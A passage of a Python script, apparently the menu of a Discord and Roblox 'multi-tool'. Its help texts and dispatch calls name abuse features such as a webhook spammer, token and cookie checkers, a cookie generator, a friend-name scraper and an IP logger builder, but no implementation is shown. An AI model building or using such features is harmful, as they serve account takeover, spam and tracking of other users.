        if really_main == "i2" or really_main == "I2" or really_main == "I 2" or really_main == "i 2":
            print("It Will Basicly Delete A Webhook")
            input("")
        if really_main == "i3" or really_main == "I3" or really_main == "I 3" or really_main == "i 3":
            print("Its Credits To Developer And Sum Info About The Program")
            input("")
        if really_main == "i4" or really_main == "I4" or really_main == "I 4" or really_main == "i 4":
            print("It Will Show A Random Persons Screenshot")
            input("")
        if really_main == "i5" or really_main == "I5" or really_main == "I 5" or really_main == "i 5":
            print("It Will Generate Nitro Codes You Can Pick If You Wanna Auto Check Them")
            input("")
        if really_main == "i6" or really_main == "I6" or really_main == "I 6" or really_main == "i 6":
            print("It Will Check If Webhook Is Valid Or Not")
            input("")
        if really_main == "i7" or really_main == "I7" or really_main == "I 7" or really_main == "i 7":
            print("It Will Generate Roblox Giftcard But Not Check Them")
            input("")
        if really_main == "i8" or really_main == "I8" or really_main == "I 8" or really_main == "i 8":
            print("It Will Check If Token Invalid Or Valid")
            input("")
        if really_main == "i9" or really_main == "I9" or really_main == "I 9" or really_main == "i 9":
            print("It Will Generate Proxies Of Your Choice In An Txt File")
            input("")
        if really_main == "i10" or really_main == "I10" or really_main == "I 10" or really_main == "i 10":
            print("You Can Send Feedback To Me And I Will Read It")
            input("")
        if really_main == "i11" or really_main == "I11" or really_main == "I 11" or really_main == "i 11":
            print("It Will Generate Roblox Cookies, It Can Be Slow If You Pick Alot It Depends On Your Pc Power")
            input("")
        if really_main == "i12" or really_main == "I12" or really_main == "I 12" or really_main == "i 12":
            print("It Will Check If A Cookie Is Valid Or Not")
            input("")
        if really_main == "i13" or really_main == "I13" or really_main == "I 13" or really_main == "i 13":
            print("It Will Spam A Server With A Webhook")
            input("")
        if really_main == "i14" or really_main == "I14" or really_main == "I 14" or really_main == "i 14":
            print("You Can Change Color Of Gui")
            input("")
        if really_main == "i15" or really_main == "I15" or really_main == "I 15" or really_main == "i 15":
            print("It Will Generate Cookies Then Auto Check Them")
            input("")
        if really_main == "i16" or really_main == "I16" or really_main == "I 16" or really_main == "i 16":
            print("It Will Snipe 5 Letter Usernames In Roblox")
            input("")
        if really_main == "i17" or really_main == "I17" or really_main == "I 17" or really_main == "i 17":
            print("It Will Give You Info Of The Webhook You Enterd")
            input("")
        if really_main == "i18" or really_main == "I18" or really_main == "I 18" or really_main == "i 18":
            print("It Will Give You Info About The Ip You Typed Into The Program")
            input("")
        if really_main == "i19" or really_main == "I19" or really_main == "I 19" or really_main == "i 19":
            print("It Will Snipe 5 Letter Tiktok Account Names For You")
            input("")
        if really_main == "i20" or really_main == "I20" or really_main == "I 20" or really_main == "i 20":
            print("It Will Discord Invites, Sum May Have Logs Or Something, This Will Take A Long Time To Get One So Recomended Leave Over Night")
            input("")
        if really_main == "i21" or really_main == "I21" or really_main == "I 21" or really_main == "i 21":
            print("It Will Scrape Info About Friends, Aka Steal All Names")
            input("")
        if really_main == "i22" or really_main == "I22" or really_main == "I 22" or really_main == "i 22":
            print("It Will Delete All Messages In An Channel (NOT DMS)")
            input("")
        if really_main == "i23" or really_main == "I23" or really_main == "I 23" or really_main == "i 23":
            print("It Will Create An Ip Logger Connected To Your Webhook")
            input("")
        if really_main == "i24" or really_main == "I24" or really_main == "I 24" or really_main == "i 24":
            print("It Will Try Snipe Pastebin Links, Can Take A Long Time")
            input("")
        if really_main == "i25" or really_main == "I25" or really_main == "I 25" or really_main == "i 25":
            print("It Will Give Info About An Invite (Server And Who Invited)")
            input("")
        if really_main == "i26" or really_main == "I26" or really_main == "I 26" or really_main == "i 26":
            print("Like A Webhook Spammer But It Not Spamming Same Messages, It Will Be Like You Typing In A Channel But You Are The Webhook If You Know What I Mean")
            input("")
        if really_main == "i27" or really_main == "I27" or really_main == "I 27" or really_main == "i 27":
            print("It Will Snipe Github Usernames")
            input("")
        if really_main == "i28" or really_main == "I28" or really_main == "I 28" or really_main == "i 28":
            print("It Will Snipe Webhooks")
            input("")
        if really_main == "i29" or really_main == "I29" or really_main == "I 29" or really_main == "i 29":
            print("It Will Calculate Roblox Fees")
            input("")
        if really_main == "i30" or really_main == "I30" or really_main == "I 30" or really_main == "i 30":
            print("It Will Download Youtube Videos")
            input("")

        if really_main == "1":
            webhook_spammer()
        if really_main == "3":
            credits()
        if really_main == "6":
            webhook_checker()
        if really_main == "12":
            cookie_checker()
        if really_main == "23":
            ip_logger_builder()
        if really_main == "4":
            private_screenshot_gen()
        if really_main == "2":
            webhook_deleter()
        if really_main == "5":
            nitro_gen()
        if really_main == "7":
            roblox_giftcard_gen()
        if really_main == "8":
            token_checker()
        if really_main == "11":
            cookie_gen()
        if really_main == "9":
            proxy_gen()
        if really_main == "10":
            feedback()
        if really_main == "24":
            pastebin_sniper()
        if really_main == "17":
            webhook_info()
        if really_main == "13":
            token_spammer()
        if really_main == "16":
            account_letter_sniper()
        if really_main == "15":
            cookie_checker_gen()
        if really_main == "22":
            mass_deleter()
        if really_main == "19":
            tikokt_sniper()
        if really_main == "18":
            ip_info()
        if really_main == "25":
            invite_to_info()
        if really_main == "20":
            discord_invite_sniper()
        if really_main == "21":
            friend_scraper()
        if really_main == "26":
            live_webhook_spammer()
        if really_main == "27":
            github_sniper()
        if really_main == "29":
            calc()
        if really_main == "30":
            yt_download()
        if really_main == "28":
            webhook_sniper()
        if really_main == "14":
            while True:
                color = input("""
            1. No Color
            2. Rainbow
            
            > """)
                if color == "1":
                    blank = True
                    rainbow = False
                    red = False
                    blue = False
                    cyan = False
                    magenta = False
                    yellow = False
                    green = False
                if color == "2":
                    blank = False
                    rainbow = True
                    red = False
                    blue = False
                    cyan = False
                    magenta = False
                    yellow = False
                    green = False
                if color == "3":
                    blank = False
                    rainbow = False
                    red = True
                    blue = False
                    cyan = False
                    magenta = False
                    yellow = False
                    green = False
                if color == "4":
                    blank = False
                    rainbow = False
                    red = False
                    blue = True
                    cyan = False
                    magenta = False
                    yellow = False
                    green = False
                if color == "5":
                    blank = False
                    rainbow = False
                    red = False
                    blue = False
                    cyan = False
                    magenta = False
                    yellow = False
                    green = True
                if color == "6":
                    blank = False
                    rainbow = False
                    red = False
                    blue = False
                    cyan = False
                    magenta = True
                    yellow = False
                    green = False
                if color == "7":
                    blank = False
                    rainbow = False
                    red = False
                    blue = False
                    cyan = False
                    magenta = False
                    yellow = True
                    green = False
                if color == "8":
                    blank = False
                    rainbow = False
                    red = False
                    blue = False
                    cyan = True
                    magenta = False
                    yellow = False
                    green = False
                if color == "1" or color == "2" or color == "3" or color == "4" or color == "5" or color == "6" or color == "7" or color == "8":
                    break
                else:
                    print("Enter A Valid Choice")
                    input("") 
#______________
#______________
#______________
#______________
#______________
#______________
#______________
#______________
#______________
#______________
#______________
#______________
#______________
#______________
#______________
#______________
#______________
#______________
#______________
#______________
#______________
#______________
#______________
#______________
#______________
#______________
#______________
#______________
#______________
#______________
#______________
#______________
#______________
#______________
#______________
#______________
#______________
#______________
#______________
#______________
#______________
#______________
#______________
#______________
#______________
#______________
#______________
#______________
#______________